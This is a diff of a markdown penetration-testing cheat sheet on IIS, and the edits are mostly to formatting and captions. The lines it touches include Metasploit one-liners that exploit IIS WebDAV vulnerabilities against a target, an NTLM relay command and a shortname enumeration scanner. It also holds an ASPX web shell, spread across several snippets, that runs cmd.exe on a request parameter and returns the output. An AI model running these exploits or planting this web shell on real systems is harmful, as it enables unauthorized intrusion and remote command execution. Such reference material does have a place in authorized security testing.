@@ -3,7 +3,7 @@ id: "31du2qg27mptl2bap"
 title: "iis"
 description: ""
 tags: []
-order: "11"
+order: 11
 createdAt: "2026-05-31T09:34:27.505Z"
 updatedAt: "2026-05-31T09:34:37.307Z"
 ---
@@ -155,8 +155,6 @@ git clone https://github.com/irsdl/IIS-ShortName-Scanner
 ```bash
 java -jar iis_shortname_scanner.jar 2 20 http://$TARGET/
 ```
-
-_shortname_
 
 **Tags:** iis, shortname, cve, enumeration, tilde
 <!-- cmd: {"id":"cp7ksjqh8mptl2ihp","language":"bash","sectionId":"xjz3ng9zamptl2ico","tags":["iis","shortname","cve","enumeration","tilde"]} -->
@@ -386,7 +384,7 @@ ntlmrelayx.py -t http://$TARGET/ -smb2support
 msfconsole -q -x "use exploit/windows/iis/iis_webdav_scstoragepathfromurl; set RHOSTS $TARGET; run"
 ```
 
-_webdav_
+_Common Vulnerabilities — CVEs_
 
 **Tags:** iis, cve, exploitation, metasploit
 <!-- cmd: {"id":"nake75p3emptl2imb","language":"bash","sectionId":"02vpp8se0mptl2ide","tags":["iis","cve","exploitation","metasploit"]} -->
@@ -396,8 +394,6 @@ _webdav_
 msfconsole -q -x "use exploit/windows/iis/ms03_007_ntdll_webdav; set RHOSTS $TARGET; run"
 ```
 
-_007_
-
 **Tags:** iis, cve, exploitation, metasploit
 <!-- cmd: {"id":"f8szbcuokmptl2img","language":"bash","sectionId":"02vpp8se0mptl2ide","tags":["iis","cve","exploitation","metasploit"]} -->
 
@@ -405,8 +401,6 @@ _007_
 ```bash
 java -jar iis_shortname_scanner.jar 2 20 http://$TARGET/
 ```
-
-_shortname_
 
 **Tags:** iis, cve, exploitation, metasploit
 <!-- cmd: {"id":"k4sfjyk9hmptl2imm","language":"bash","sectionId":"02vpp8se0mptl2ide","tags":["iis","cve","exploitation","metasploit"]} -->
@@ -572,7 +566,7 @@ _ASPX Webshell_
 
 ### d5dv9nqtqmptl2iq7
 ```bash
-<%
+<% 
 ```
 
 **Tags:** iis, webshell, aspx, post-exploitation
@@ -580,7 +574,7 @@ _ASPX Webshell_
 
 ### 7x5uupi45mptl2iqc
 ```bash
-string cmd = Request["cmd"];
+  string cmd = Request["cmd"];
 ```
 
 **Tags:** iis, webshell, aspx, post-exploitation
@@ -588,7 +582,7 @@ string cmd = Request["cmd"];
 
 ### bh4mc45azmptl2iqi
 ```bash
-Process p = new Process();
+  Process p = new Process();
 ```
 
 **Tags:** iis, webshell, aspx, post-exploitation
@@ -596,7 +590,7 @@ Process p = new Process();
 
 ### yxbjtyjr8mptl2iqn
 ```bash
-p.StartInfo.FileName = "cmd.exe";
+  p.StartInfo.FileName = "cmd.exe";
 ```
 
 **Tags:** iis, webshell, aspx, post-exploitation
@@ -604,7 +598,7 @@ p.StartInfo.FileName = "cmd.exe";
 
 ### fd8fqkk8omptl2iqs
 ```bash
-p.StartInfo.Arguments = "/c " + cmd;
+  p.StartInfo.Arguments = "/c " + cmd;
 ```
 
 **Tags:** iis, webshell, aspx, post-exploitation
@@ -612,7 +606,7 @@ p.StartInfo.Arguments = "/c " + cmd;
 
 ### ckra5qnjfmptl2iqw
 ```bash
-p.StartInfo.UseShellExecute = false;
+  p.StartInfo.UseShellExecute = false;
 ```
 
 **Tags:** iis, webshell, aspx, post-exploitation
@@ -620,7 +614,7 @@ p.StartInfo.UseShellExecute = false;
 
 ### bz9s2dfylmptl2ir2
 ```bash
-p.StartInfo.RedirectStandardOutput = true;
+  p.StartInfo.RedirectStandardOutput = true;
 ```
 
 **Tags:** iis, webshell, aspx, post-exploitation
@@ -628,7 +622,7 @@ p.StartInfo.RedirectStandardOutput = true;
 
 ### 81pj7pm11mptl2ir7
 ```bash
-p.Start();
+  p.Start();
 ```
 
 **Tags:** iis, webshell, aspx, post-exploitation
@@ -636,7 +630,7 @@ p.Start();
 
 ### 36nze449hmptl2ird
 ```bash
-Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
+  Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
 ```
 
 **Tags:** iis, webshell, aspx, post-exploitation
